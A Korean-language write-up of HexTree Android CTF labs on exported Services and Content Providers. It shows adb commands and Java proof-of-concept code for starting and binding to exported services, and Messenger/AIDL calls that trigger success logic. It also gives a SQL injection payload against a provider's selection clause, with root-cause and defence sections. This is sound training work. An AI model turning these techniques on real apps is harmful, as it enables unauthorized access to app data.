- ordered broadcast는 receiver 간에 result code/data/extras가 전달될 수 있으므로, 민감 정보를 result로 넘기는 것도 노출면이 된다.
- implicit ordered broadcast는 외부 앱 receiver가 중간에 끼어들어 extra를 읽거나 result code/data를 조작할 수 있다.
- 앱 위젯도 `AppWidgetProvider`/`BroadcastReceiver` 구조를 사용하므로, exported widget receiver는 일반 receiver처럼 공격 표면이 될 수 있다.
- 시스템 action을 흉내 내는 입력을 처리할 때 substring 검사만 사용하면 보호된 action을 우회하는 커스텀 action이 통과할 수 있다.
- notification action도 `PendingIntent`를 통해 Activity/Service/Receiver를 호출하므로, notification 뒤의 Intent 흐름까지 검토해야 한다.
- notification action의 PendingIntent에 민감한 extra를 넣고 implicit broadcast로 보내면, 같은 action을 듣는 외부 receiver가 내용을 관찰할 수 있다.
- sender 제한이 필요한 경우 `android:exported=false`, custom permission, signature permission, package 제한 등을 고려해야 한다.

### 참고 자료

1. [HexTree: Broadcast Receivers](https://app.hextree.io/courses/broadcast-receivers)
2. [HexTree: Sending Broadcasts](https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/sending-broadcasts)
3. [Android Developers: Broadcasts overview](https://developer.android.com/develop/background-work/background-tasks/broadcasts)
4. [Android Developers: Broadcast security considerations](https://developer.android.com/develop/background-work/background-tasks/broadcasts#security-considerations)
5. [HexTree: Intercept and Redirecting Broadcasts](https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/intercept-and-redirecting-broadcasts)
6. [HexTree: Hijack broadcast intent](https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/intercept-and-redirecting-broadcasts)
7. [HexTree: Home Screen App Widgets](https://app.hextree.io/courses/broadcast-receivers/android-features-with-broadcasts/home-screen-app-widgets)
8. [Android Developers: AppWidgetManager](https://developer.android.com/reference/android/appwidget/AppWidgetManager)
9. [HexTree: The Notification System](https://app.hextree.io/courses/broadcast-receivers/android-features-with-broadcasts/the-notification-system)
10. [Android Developers: Create a notification](https://developer.android.com/develop/ui/compose/notifications/create-notification)
11. [Android Developers: Notification runtime permission](https://developer.android.com/develop/ui/compose/notifications/notification-permission)
12. [Android Developers: PendingIntent](https://developer.android.com/reference/android/app/PendingIntent)


---

## HexTree Android Track — Android Services

### 1. 트랙 목표

이 트랙에서는 Android `Service`가 앱의 공격 표면이 되는 방식을 확인한다. 이전 트랙에서 Activity와 BroadcastReceiver가 Intent를 통해 외부 앱과 상호작용할 수 있음을 확인했다면, Services 트랙에서는 화면이 없는 백그라운드 컴포넌트도 `Intent` 입력을 받을 수 있고, `android:exported` 설정에 따라 외부 앱 또는 ADB에서 직접 호출될 수 있음을 실습한다.

Android 공식 문서 기준으로 Service는 UI를 제공하지 않는 앱 컴포넌트이며, 백그라운드에서 장기 작업을 수행하거나 다른 프로세스와 IPC를 수행할 수 있다. Service는 크게 started service와 bound service로 나뉜다. started service는 `startService()` 호출로 시작되고, Service 내부의 `onStartCommand()`가 호출되면서 전달된 Intent를 처리한다. [Android Developers: Services overview](https://developer.android.com/develop/background-work/services)

### 2. 핵심 개념

#### Service

`Service`는 화면을 표시하지 않는 Android 컴포넌트다. 네트워크 요청, 파일 처리, 음악 재생, IPC 같은 작업을 사용자 화면과 별개로 수행할 때 사용된다. 하지만 화면이 없다는 점 때문에 보안 검토에서 놓치기 쉽다.

Android 앱의 핵심 컴포넌트는 Activity, Service, BroadcastReceiver, ContentProvider이며, 각 컴포넌트는 앱으로 들어가는 entry point가 될 수 있다. [Android Developers: Application fundamentals](https://developer.android.com/guide/components/fundamentals)

#### Started Service와 `onStartCommand()`

다른 컴포넌트가 `startService()`에 Intent를 넘기면 Android framework는 대상 Service의 `onStartCommand(Intent intent, int flags, int startId)`를 호출한다. 이때 Service는 Intent의 action, data, extras를 읽고 동작을 결정할 수 있다.

보안 관점에서는 `onStartCommand()`가 외부 입력 처리 지점이다. exported service라면 공격자는 다음 값을 직접 조작할 수 있다.

- action
- data URI
- extras
- component name

#### `android:exported`

Service가 manifest에서 `android:exported="true"`로 선언되어 있으면 외부 앱도 해당 Service를 시작할 수 있다. Android 공식 문서도 Service를 앱 내부에서만 쓰려면 manifest에서 `android:exported="false"`로 설정해 외부 앱 접근을 막을 수 있다고 설명한다. [Android Developers: Services overview](https://developer.android.com/develop/background-work/services)

### 3. Starting a Service

대상 페이지: [HexTree: Starting a Service](https://app.hextree.io/courses/android-services/service-threat-surface/starting-a-service)

#### 분석

먼저 APK의 `AndroidManifest.xml`에서 service 선언을 확인했다.

```xml
<service
    android:name="io.hextree.attacksurface.services.Flag24Service"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.services.START_FLAG24_SERVICE" />
    </intent-filter>
</service>
```

여기서 중요한 부분은 두 가지다.

1. `Flag24Service`가 exported 상태다.
2. `io.hextree.services.START_FLAG24_SERVICE` action을 받는다.

이후 `Flag24Service.onStartCommand()`를 확인했다. 로직은 단순했다.

```text
onStartCommand(intent, flags, startId)
  -> intent dump를 logcat에 출력
  -> intent.getAction() 확인
  -> action == io.hextree.services.START_FLAG24_SERVICE 이면 success()
```

`success()`는 target 앱 내부에서 `Flag24Activity`를 실행한다. `Flag24Activity` 자체는 `exported=false`라 외부에서 직접 열 수 없지만, exported service를 거치면 target 앱 context에서 내부 Activity가 실행된다.

#### Exploit

ADB에서 exported service를 명시적으로 지정하고, 필요한 action을 넣어 시작했다.

```powershell
adb shell am startservice `
  -a io.hextree.services.START_FLAG24_SERVICE `
  io.hextree.attacksurface/.services.Flag24Service
```

실행 후 logcat에서 Service가 받은 Intent와 성공 로그를 확인했다.

```text
Flag24Service: [Action]    io.hextree.services.START_FLAG24_SERVICE
Flag24Service: [Component] ComponentInfo{io.hextree.attacksurface/io.hextree.attacksurface.services.Flag24Service}
ActivityTaskManager: START ... Flag24Activity ... (has extras)
Flag24: success() called!
Flag24: HXT{...}
```

#### 취약 원인

`Flag24Service`가 외부 앱에서 호출 가능한 exported service였고, `onStartCommand()`에서 action 문자열 하나만으로 성공 경로를 실행했다. 그 결과 외부 호출자가 내부 Activity를 직접 열 수 없어도, service를 경유해 target 앱 내부의 성공 로직을 실행할 수 있었다.

#### 방어 방안

- 내부용 service는 `android:exported="false"`로 설정한다.
- exported service가 필요하다면 custom permission 또는 signature permission을 요구한다.
- `onStartCommand()`에서 action 문자열만으로 권한 있는 동작을 수행하지 않는다.
- 외부 Intent extras/action/data는 모두 신뢰하지 말고 호출 권한과 내부 상태를 함께 검증한다.

### 4. Multiple Service Starts

#### 분석

Flag 25도 manifest에서 exported service로 노출되어 있었다.

```xml
<service
    android:name="io.hextree.attacksurface.services.Flag25Service"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.services.UNLOCK1" />
        <action android:name="io.hextree.services.UNLOCK2" />
        <action android:name="io.hextree.services.UNLOCK3" />
    </intent-filter>
</service>
```

`Flag25Service` 내부에는 `lock1`, `lock2`, `lock3` 세 boolean 상태가 있었다. `onStartCommand()`는 들어온 Intent action에 따라 lock 상태를 변경했다.

```text
UNLOCK1 -> lock1 = true
UNLOCK2 -> lock1이 true일 때만 lock2 = true, 아니면 reset
UNLOCK3 -> lock2가 true일 때만 lock3 = true, 아니면 reset

lock1 && lock2 && lock3 이 모두 true이면 success()
```

즉, 하나의 Intent로 끝나는 문제가 아니라 같은 service 인스턴스에 여러 번 `startService()`를 호출해 내부 상태를 순서대로 맞춰야 했다. Android 문서에서도 started service는 `startService()` 요청을 받으면 `onStartCommand()`에서 Intent를 처리한다고 설명한다. 이 구조에서는 Service 객체가 살아 있는 동안 내부 상태가 다음 호출까지 이어질 수 있다. [Android Developers: Services overview](https://developer.android.com/develop/background-work/services)

#### Exploit

세 action을 순서대로 보냈다.

```powershell
adb shell am startservice `
  -a io.hextree.services.UNLOCK1 `
  io.hextree.attacksurface/.services.Flag25Service

adb shell am startservice `
  -a io.hextree.services.UNLOCK2 `
  io.hextree.attacksurface/.services.Flag25Service

adb shell am startservice `
  -a io.hextree.services.UNLOCK3 `
  io.hextree.attacksurface/.services.Flag25Service
```

검증 로그는 다음과 같았다.

```text
Flag25Service: [Action] io.hextree.services.UNLOCK1
Flag25Service: lock1:true lock2:false lock3:false

Flag25Service: [Action] io.hextree.services.UNLOCK2
Flag25Service: lock1:true lock2:true lock3:false

Flag25Service: [Action] io.hextree.services.UNLOCK3
Flag25Service: resetting locks
Flag25Service: lock1:false lock2:false lock3:false
Flag25: success() called!
Flag25: HXT{...}
```

`resetting locks` 로그는 성공 직후 `success()`를 호출한 다음 상태를 초기화하면서 출력된 것이다.

#### 취약 원인

`Flag25Service`가 exported 상태였고, 외부 호출자가 여러 번 `startService()`를 호출해 내부 상태 머신을 원하는 순서대로 진행시킬 수 있었다. 서비스 내부 상태를 권한 검증 없이 외부 Intent action만으로 변경한 점이 핵심이다.

#### 방어 방안

- 외부 호출이 필요 없는 service는 `android:exported="false"`로 둔다.
- 여러 단계 상태가 필요한 로직은 외부 Intent action만으로 진행하지 않는다.
- exported service가 필요하면 호출자 권한, 서명 권한, nonce/session 같은 별도 검증을 추가한다.
- Service 내부 상태가 보안 조건으로 쓰인다면 재시작/중복 호출/순서 조작 가능성을 함께 고려한다.

### 5. Bound Services — Message Handler Service

대상 페이지: [HexTree: Message Handler Service](https://app.hextree.io/courses/android-services/bound-services/message-handler-service)

#### 개념 정리: Bound Service와 Messenger

Started Service는 `startService()`로 실행되고 `onStartCommand()`에서 Intent를 처리한다. 반면 Bound Service는 클라이언트가 `bindService()`로 연결하고, Service의 `onBind()`가 반환한 `IBinder`를 통해 IPC 인터페이스를 제공한다.

Android 공식 문서 기준으로 bound service는 client-server 인터페이스이며, Activity 같은 컴포넌트가 service에 bind해서 요청을 보내고 응답을 받을 수 있다. `Messenger`를 사용하는 경우 Service는 `Handler`를 구현하고, 클라이언트는 Service가 반환한 `IBinder`로 `Messenger`를 만든 뒤 `Message` 객체를 전송한다. Service 쪽에서는 `Handler.handleMessage()`가 외부 입력 처리 지점이 된다. [Android Developers: Bound services overview](https://developer.android.com/develop/background-work/services/bound-services)

보안 관점에서 `exported=true`인 bound service는 다음 값들이 공격자가 조작 가능한 입력이 된다.

- `Message.what`
- `Message.getData()`에 담긴 `Bundle`
- `Message.obj`
- `Message.replyTo`

#### Flag 26 — `Message.what` 값 조작

`Flag26Service`는 manifest에서 exported service로 노출되어 있었고, `onBind()`에서 `Messenger`의 binder를 반환했다.

```text
onBind(intent)
  -> return messenger.getBinder()

IncomingHandler.handleMessage(msg)
  -> msg.what == 42 이면 success()
```

즉, Activity처럼 화면을 여는 컴포넌트가 아니더라도 외부 앱이 service에 bind한 뒤 `what=42`인 `Message`를 보내면 성공 조건을 만족할 수 있었다.

PoC 흐름은 다음과 같다.

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.services.Flag26Service"
));

bindService(intent, connection, Context.BIND_AUTO_CREATE);

// onServiceConnected()에서 받은 IBinder 사용
Messenger target = new Messenger(service);
target.send(Message.obtain(null, 42));
```

실습 환경에서는 첫 시도에서 target 앱이 background 상태일 때 내부 flag Activity 실행이 Android에 의해 차단되었다. 그래서 PoC Activity에서 2초 후 메시지를 보내도록 만들고, 그 사이 HexTree 앱을 foreground로 올려 성공 로그를 확인했다.

```powershell
adb shell am start -n io.hextree.intentpoc/.BoundFlag26Activity
adb shell am start -n io.hextree.attacksurface/.MainActivity
```

검증 로그는 다음 형태였다.

```text
BoundFlag26PoC: bindService Flag26Service bound=true
Flag26Service: handleMessage(42)
Flag26: success() called!
Flag26: HXT{...}
```

#### Flag 27 — `replyTo`를 이용한 password 왕복

`Flag27Service`도 exported bound service였다. 이 문제는 단순히 특정 `what` 값을 보내는 것만으로는 끝나지 않고, service가 발급한 password를 받아 다시 제출해야 했다.

정적 분석 결과 `handleMessage()`는 세 가지 메시지를 처리했다.

```text
MSG_ECHO = 1
  -> Bundle["echo"] 값을 저장

MSG_GET_PASSWORD = 2
  -> msg.obj != null 인 경우 password를 생성
  -> msg.replyTo로 password 응답 전송

MSG_GET_FLAG = 3
  -> echo == "give flag"
  -> 전달한 password가 service 내부 password와 같으면 success()
```

여기서 중요한 조건은 두 가지였다.

1. 먼저 `what=1`로 `echo="give flag"`를 저장해야 한다.
2. `what=2` 요청에는 `replyTo`뿐 아니라 `obj`도 null이 아니어야 한다.

PoC 메시지 순서는 다음과 같이 구성했다.

```java
// 1) echo 저장
Message echo = Message.obtain(null, 1);
Bundle echoData = new Bundle();
echoData.putString("echo", "give flag");
echo.setData(echoData);
target.send(echo);

// 2) password 요청
Message getPassword = Message.obtain(null, 2);
getPassword.obj = new Bundle();
getPassword.replyTo = attackerMessenger;
target.send(getPassword);

// 3) attacker Handler에서 password 수신 후 다시 제출
Message getFlag = Message.obtain(null, 3);
Bundle flagData = new Bundle();
flagData.putString("password", password);
getFlag.setData(flagData);
getFlag.replyTo = attackerMessenger;
target.send(getFlag);
```

검증 로그는 다음 형태였다.

```text
BoundFlag27PoC: sent echo what=1
BoundFlag27PoC: sent get-password what=2
BoundFlag27PoC: reply what=2 password=<uuid>
BoundFlag27PoC: sent get-flag what=3
BoundFlag27PoC: reply what=3 reply=success! Launching flag activity
Flag27: success() called!
Flag27: HXT{...}
```

#### 취약 원인

두 문제 모두 Service가 `android:exported="true"`로 외부 앱에 노출되어 있었고, `onBind()`가 반환한 `IBinder`를 통해 외부 앱이 내부 `Handler`에 직접 `Message`를 보낼 수 있었다. `handleMessage()`는 호출자 신원이나 권한을 검증하지 않고 `Message.what`, `Bundle`, `obj`, `replyTo` 같은 외부 입력만으로 민감한 성공 로직을 실행했다.

#### 방어 방안

- 내부 IPC 용도라면 service를 `android:exported="false"`로 둔다.
- exported bound service가 필요하면 manifest permission 또는 signature-level permission을 요구한다.
- `handleMessage()`에서 `Message.what` 값만으로 민감 동작을 실행하지 않는다.
- `replyTo`로 민감 정보를 돌려줄 때 호출자 권한과 요청 상태를 검증한다.
- 임시 password/token을 발급하더라도 외부 클라이언트가 그대로 재사용할 수 있는 구조는 피한다.

### 6. Bound Services — Bind to AIDL Service with AIDL File

대상 페이지: [HexTree: Bind to AIDL Service with AIDL File](https://app.hextree.io/courses/android-services/bound-services/bind-to-aidl-service-with-aidl-file)

#### 개념 정리: AIDL

AIDL(Android Interface Definition Language)은 서로 다른 Android 프로세스가 같은 Java 객체 메모리를 직접 공유할 수 없기 때문에, IPC에 사용할 인터페이스를 `.aidl` 파일로 정의하고 Android SDK가 `IBinder` 기반 코드를 생성하게 하는 방식이다. Android 공식 문서도 AIDL을 client와 service가 IPC를 위해 합의하는 programming interface를 정의하는 언어라고 설명한다. [Android Developers: AIDL](https://developer.android.com/develop/background-work/services/aidl)

실습 관점에서 중요한 점은 다음과 같다.

- target service가 반환하는 binder의 descriptor와 client가 만든 AIDL descriptor가 같아야 한다.
- `.aidl` 파일의 package와 interface 이름이 target과 같아야 한다.
- 메서드 순서가 transaction code에 영향을 주므로 target Stub의 메서드 순서와 맞춰야 한다.
- service가 `exported=true`이면 외부 앱도 `bindService()`로 binder를 받아 AIDL 메서드를 호출할 수 있다.

#### Flag 28 — 단일 AIDL 메서드 호출

정적 분석 결과 `Flag28Service`는 `IFlag28Interface$Stub`를 binder로 반환했다.

```text
IFlag28Interface
  boolean openFlag()

TRANSACTION_openFlag = 1
```

`Flag28Service$1.openFlag()`는 별도 인자 없이 내부 `success()`를 호출하고, `success()`는 target 앱 context에서 `Flag28Activity`를 실행했다. 따라서 PoC 앱에는 target과 같은 package/interface 이름의 AIDL 파일을 추가했다.

```aidl
package io.hextree.attacksurface.services;

interface IFlag28Interface {
    boolean openFlag();
}
```

PoC 흐름은 다음과 같다.

```java
Intent intent = new Intent();
intent.setClassName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.services.Flag28Service"
);

bindService(intent, connection, BIND_AUTO_CREATE);

// onServiceConnected()
IFlag28Interface remote = IFlag28Interface.Stub.asInterface(service);
remote.openFlag();
```

검증 로그는 다음 형태였다.

```text
AidlFlag28PoC: bindService Flag28Service bound=true
AidlFlag28PoC: connected to ComponentInfo{...Flag28Service}
AidlFlag28PoC: openFlag() returned true
Flag28: success() called!
Flag28: HXT{...}
```

#### Flag 29 — AIDL 메서드 호출 순서 조합

`Flag29Service`는 `IFlag29Interface$Stub`를 binder로 반환했다. 인터페이스와 transaction code는 다음과 같았다.

```text
IFlag29Interface
  String init()                 // transaction 1
  void authenticate(String pw)  // transaction 2
  void success()                // transaction 3
```

service 내부 binder 객체는 생성 시 랜덤 password를 만들고, `init()`에서 그 값을 반환했다. `authenticate(password)`가 맞으면 내부 Intent에 `authenticated=true`를 저장하고, 이후 `success()`가 이 값을 확인한 뒤 `Flag29Activity`를 실행했다.

PoC 앱에는 target과 같은 AIDL 파일을 추가했다.

```aidl
package io.hextree.attacksurface.services;

interface IFlag29Interface {
    String init();
    void authenticate(String password);
    void success();
}
```

호출 순서는 다음과 같다.

```java
IFlag29Interface remote = IFlag29Interface.Stub.asInterface(service);

String password = remote.init();
remote.authenticate(password);
remote.success();
```

검증 로그는 다음 형태였다.

```text
AidlFlag29PoC: bindService Flag29Service bound=true
Flag29: service.init()
AidlFlag29PoC: init() returned password=<uuid>
Flag29: service.authenticate(<uuid>)
Flag29: service.success()
Flag29: success() called!
Flag29: HXT{...}
```

#### 취약 원인

`Flag28Service`, `Flag29Service` 모두 외부 앱에서 bind 가능한 exported service였고, AIDL 인터페이스 메서드에서 호출자 검증 없이 flag Activity 실행으로 이어지는 동작을 제공했다. 특히 Flag29는 password를 둔 것처럼 보이지만, 같은 AIDL 인터페이스에 `init()`과 `authenticate()`가 모두 공개되어 있어서 외부 클라이언트가 password 발급과 인증을 같은 흐름에서 수행할 수 있었다.

#### 방어 방안

- 내부 앱 전용 AIDL service는 `android:exported="false"`로 설정한다.
- 외부 IPC가 필요하다면 signature permission을 요구한다.
- AIDL 메서드별로 호출자 UID/package/signature를 확인한다.
- `init()`처럼 인증 재료를 발급하는 메서드와 `success()`처럼 민감 동작을 실행하는 메서드를 같은 외부 인터페이스에 그대로 노출하지 않는다.
- AIDL 호출은 remote process에서 들어올 수 있고 멀티스레드로 처리될 수 있으므로, 인증 상태를 binder 객체의 단순 mutable state에만 의존하지 않는다.

### 7. 배운 점

- Service도 Activity, BroadcastReceiver와 동일하게 앱의 entry point가 될 수 있다.
- `startService()`로 전달된 Intent는 `onStartCommand()`에서 처리되므로 공격자가 조작 가능한 입력으로 봐야 한다.
- `exported=true` service는 외부 앱이 명시적 component name으로 호출할 수 있다.
- 내부 Activity가 `exported=false`여도, exported service가 내부 Activity 실행을 대신하면 우회 경로가 된다.
- Service 객체가 살아 있는 동안 내부 상태가 유지될 수 있으므로, 여러 번의 외부 호출을 조합한 상태 머신 우회도 공격 시나리오가 된다.
- Bound Service는 `onBind()`가 반환한 `IBinder` 자체가 IPC 인터페이스가 되므로, exported 상태라면 `handleMessage()` 같은 메시지 처리 로직도 공격 표면으로 봐야 한다.
- `Message.replyTo`는 정상적인 양방향 통신 기능이지만, 검증 없이 민감 데이터를 회신하면 공격자가 challenge-response 흐름을 그대로 악용할 수 있다.
- AIDL은 메서드 호출처럼 보이지만 실제로는 Binder transaction이므로, 외부에 공개된 AIDL 메서드는 그대로 remote attack surface가 된다.
- 인증용 값이 있더라도 그 값을 발급하는 메서드와 사용하는 메서드가 모두 외부에 공개되어 있으면 보안 경계가 되지 못한다.

### 참고 자료

1. [HexTree: Android Services](https://app.hextree.io/courses/android-services)
2. [HexTree: Starting a Service](https://app.hextree.io/courses/android-services/service-threat-surface/starting-a-service)
3. [Android Developers: Services overview](https://developer.android.com/develop/background-work/services)
4. [Android Developers: Application fundamentals](https://developer.android.com/guide/components/fundamentals)
5. [HexTree: Message Handler Service](https://app.hextree.io/courses/android-services/bound-services/message-handler-service)
6. [Android Developers: Bound services overview](https://developer.android.com/develop/background-work/services/bound-services)
7. [HexTree: Bind to AIDL Service with AIDL File](https://app.hextree.io/courses/android-services/bound-services/bind-to-aidl-service-with-aidl-file)
8. [Android Developers: Android Interface Definition Language](https://developer.android.com/develop/background-work/services/aidl)


---

## HexTree Android Track — Content Provider

### 1. 트랙 목표

이 트랙에서는 Android `ContentProvider`가 앱의 데이터 접근 경로이자 공격 표면이 되는 방식을 확인한다. 앞선 트랙에서 Activity, BroadcastReceiver, Service를 Intent/IPC 관점에서 다뤘다면, Content Provider 트랙에서는 `content://` URI와 `ContentResolver`를 통해 다른 앱의 구조화된 데이터에 접근하는 흐름을 실습한다.

Android 공식 문서 기준으로 Content Provider는 앱 내부의 중앙 데이터 저장소에 대한 접근을 관리하며, 다른 앱은 `ContentResolver`를 통해 provider의 `query()`, `insert()`, `update()`, `delete()` 같은 메서드를 호출할 수 있다. [Android Developers: Content provider basics](https://developer.android.com/guide/topics/providers/content-provider-basics?hl=en)

### 2. 핵심 개념

#### Content Provider

`ContentProvider`는 앱이 보유한 데이터를 외부에 표준화된 인터페이스로 제공하는 Android 컴포넌트다. 데이터는 SQLite 테이블처럼 행(row)과 열(column) 형태로 노출될 수 있고, 클라이언트는 직접 DB 파일을 여는 것이 아니라 `ContentResolver` API로 provider에 요청을 보낸다.

공격 관점에서는 provider의 `query()`가 중요한 입력 처리 지점이다. 클라이언트가 조작할 수 있는 대표 값은 다음과 같다.

- `Uri`
- `projection`
- `selection`
- `selectionArgs`
- `sortOrder`

#### Content URI

Content Provider 접근에는 `content://` URI가 사용된다. URI는 보통 다음 형태다.

```text
content://<authority>/<path>
```

Android 공식 문서 기준으로 authority는 provider 자체를 식별하고, path는 provider 내부의 특정 테이블이나 데이터 집합을 가리킨다. 예를 들어 `content://user_dictionary/words`에서 `user_dictionary`는 authority, `words`는 path다. [Android Developers: Content provider basics](https://developer.android.com/guide/topics/providers/content-provider-basics?hl=en)

#### `android:exported`

Provider가 manifest에서 `android:exported="true"`이면 다른 앱도 해당 provider의 content URI에 접근할 수 있다. Android manifest 문서에서도 exported provider는 다른 애플리케이션에서 사용할 수 있으며, `exported="false"`이면 같은 UID 앱이나 임시 URI 권한을 받은 앱으로 접근이 제한된다고 설명한다. [Android Developers: `<provider>`](https://developer.android.com/guide/topics/manifest/provider-element)

#### Temporary URI Permission

`android:exported="false"`인 provider라도 앱이 의도적으로 특정 `content://` URI 권한을 다른 앱에 넘길 수 있다. Android 공식 문서 기준으로 result intent에 `FLAG_GRANT_READ_URI_PERMISSION` 또는 `FLAG_GRANT_WRITE_URI_PERMISSION`을 붙이면, 수신 앱은 해당 URI에 대해 임시 접근 권한을 얻는다. 이 권한은 provider 전체가 아니라 Intent에 포함된 특정 URI에 적용된다. [Android Developers: Content provider basics](https://developer.android.com/guide/topics/providers/content-provider-basics?hl=en)

#### AndroidX FileProvider

`FileProvider`는 앱 내부 파일을 `file://` 경로로 직접 노출하지 않고 `content://` URI로 공유하기 위한 AndroidX 컴포넌트다. 공식 문서 기준으로 FileProvider는 manifest에서 `exported=false`, `grantUriPermissions=true`로 선언하고, 공유 가능한 파일 경로는 XML `<paths>` 리소스에 미리 정의한다. 또한 `getUriForFile()`로 생성한 URI는 `ContentResolver.openFileDescriptor()` 등을 통해 수신 앱이 열 수 있다. [Android Developers: AndroidX FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider)

### 3. Reverse Engineering SQLite ContentProvider

대상 페이지: [HexTree: Reverse Engineering SQLite ContentProvider](https://app.hextree.io/courses/content-provider/introduction-to-provider/reverse-engineering-sqlite-contentprovid)

#### Flag 30 — 단순 path 기반 query

먼저 manifest에서 provider 선언을 확인했다.

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag30Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag30" />
```

`Flag30Provider.query()`를 역분석하면 URI path가 `/success`인지 확인한 뒤 SQLite `Flag` 테이블을 조회한다.

```text
query(uri, projection, selection, selectionArgs, sortOrder)
  -> uri.getPath() == "/success" 확인
  -> table: Flag
  -> where: name=? AND visible=1
  -> args: ["flag30"]
  -> success() 호출
  -> Cursor 반환
```

따라서 필요한 URI는 다음과 같다.

```text
content://io.hextree.flag30/success
```

ADB에서 `content query`로 provider를 직접 조회했다.

```powershell
adb shell content query --uri content://io.hextree.flag30/success
```

조회 결과는 다음 형태였다.

```text
Row: 0 _id=1, name=flag30, value=HXT{...}, visible=1
Flag30Provider.query('/success')
Flag30: success() called!
```

#### Flag 31 — UriMatcher와 path id 조건

`Flag31Provider`도 exported provider로 노출되어 있었다.

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag31Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag31" />
```

정적 초기화 코드에서 `UriMatcher` 설정을 확인했다.

```text
authority: io.hextree.flag31
path "flags"  -> code 1
path "flag/#" -> code 2
```

하지만 `query()` 구현에서 `flags` 경로는 `"FLAGS not implemented yet"` 예외로 이어졌고, 실제 사용 가능한 경로는 `flag/#`였다. 이후 `ContentUris.parseId(uri)`로 마지막 path segment의 숫자를 읽고, 그 값이 `31`일 때만 `success()`를 호출했다.

```text
query(uri, ...)
  -> uriMatcher.match(uri) == 2 확인
  -> ContentUris.parseId(uri)
  -> id == 31 이면 success()
  -> table: Flag
  -> where: name=? AND visible=1
  -> args: ["flag" + id]
```

따라서 필요한 URI는 다음과 같다.

```text
content://io.hextree.flag31/flag/31
```

ADB 조회 명령은 다음과 같다.

```powershell
adb shell content query --uri content://io.hextree.flag31/flag/31
```

검증 로그는 다음 형태였다.

```text
Row: 0 _id=2, name=flag31, value=HXT{...}, visible=1
Flag31Provider.query('/flag/31'): 2
Flag31: FLAG_ID: 31
Flag31: success() called!
```

#### 취약 원인

두 provider 모두 `android:exported="true"`였고 별도 read permission이 없었다. 그 결과 외부 호출자가 provider authority와 path만 알면 `ContentResolver.query()` 또는 `adb shell content query`로 내부 SQLite 데이터에 접근할 수 있었다.

Flag30은 `/success`라는 고정 path만 알면 되었고, Flag31은 `UriMatcher`에 등록된 `flag/#` 패턴과 id `31` 조건을 맞추면 되었다. 두 경우 모두 provider의 `query()` 메서드가 외부 입력 URI를 신뢰하고 성공 로직까지 실행한 점이 핵심이다.

#### 방어 방안

- 외부 공유가 필요 없는 provider는 `android:exported="false"`로 설정한다.
- 외부 공유가 필요하다면 `readPermission`, `writePermission`, `path-permission`을 적용한다.
- `query()` 내부에서 URI path만으로 민감 동작을 실행하지 않는다.
- `projection`, `selection`, `selectionArgs`, `sortOrder` 같은 외부 입력이 SQL 쿼리에 들어가는 경우 허용 목록 기반으로 검증한다.
- 민감한 row나 column은 provider query 결과에 포함하지 않거나, 호출자 권한에 따라 별도로 필터링한다.

### 4. SQL Injection in Content Providers

대상 페이지: [HexTree: SQL Injection in Content Providers](https://app.hextree.io/courses/content-provider/introduction-to-provider/sql-injection-in-content-providers)

#### Flag 32 — `selection` 문자열 주입

Flag32는 같은 SQLite `Flag` 테이블을 사용하지만, `flag32` row의 `visible` 값이 `0`으로 저장되어 있었다. 정상적인 조회 조건은 `visible=1`이므로 단순 조회로는 숨겨진 flag32 row가 반환되지 않는다.

manifest에서는 다음 provider가 외부에 노출되어 있었다.

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag32Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag32" />
```

역분석 결과 `UriMatcher`에는 다음 path가 등록되어 있었다.

```text
authority: io.hextree.flag32
path "flags"  -> code 1
path "flag/#" -> code 2
```

핵심은 `/flags` 경로 처리 방식이었다. provider는 기본 조건으로 `visible=1`을 사용하지만, 외부 호출자가 넘긴 `selection`이 있으면 이 값을 문자열로 이어 붙였다.

```text
where = "visible=1"

if (selection != null) {
    where = "visible=1 AND (" + selection + ")"
}
```

Android의 `ContentResolver.query()`에서 `selection`은 SQL `WHERE` 절에 들어갈 필터 조건이고, `selectionArgs`는 `?` placeholder에 바인딩되는 값이다. 이 문제에서는 `selectionArgs`로 안전하게 바인딩하지 않고 caller-controlled `selection` 문자열을 그대로 SQL 조건에 합쳐 SQL Injection이 가능했다. [Android Developers: Content provider basics](https://developer.android.com/guide/topics/providers/content-provider-basics?hl=en)

사용한 payload는 다음과 같다.

```text
1=1) OR name='flag32' -- 
```

provider 내부에서 최종 조건은 다음 형태가 된다.

```sql
visible=1 AND (1=1) OR name='flag32' -- )
```

마지막 `--`는 뒤쪽의 닫는 괄호를 주석 처리하고, `OR name='flag32'` 조건으로 `visible=0`인 숨겨진 row까지 조회 결과에 포함시킨다.

ADB에서는 다음과 같이 실행했다.

```powershell
adb shell 'content query --uri content://io.hextree.flag32/flags --where "1=1) OR name=''flag32'' -- "'
```

조회 결과는 다음 형태였다.

```text
Row: 0 _id=1, name=flag30, value=HXT{...}, visible=1
Row: 1 _id=2, name=flag31, value=HXT{...}, visible=1
Row: 2 _id=3, name=flag32, value=HXT{...}, visible=0
Flag32Provider.query('/flags'): 1
FLAGS: visible=1 AND (1=1) OR name='flag32' -- )
Flag32: success() called!
```

#### 취약 원인

Flag32의 직접 원인은 외부 입력인 `selection`을 SQL 문자열에 그대로 연결한 것이다. Content Provider가 exported 상태였기 때문에 다른 앱이나 ADB에서 `content://io.hextree.flag32/flags`로 접근할 수 있었고, caller가 원하는 SQL 조건을 provider 내부 쿼리에 주입할 수 있었다.

추가로, provider가 조회 결과 cursor를 순회하면서 `name=flag32` row가 포함되었는지 확인하고 `success()`를 호출했다. 즉, 단순 정보 노출뿐 아니라 조작된 조회 결과가 앱의 내부 성공 로직까지 트리거했다.

#### 방어 방안

- caller-controlled `selection`을 SQL 문자열에 직접 이어 붙이지 않는다.
- 값 비교는 `name=?` 같은 placeholder와 `selectionArgs` 바인딩으로 처리한다.
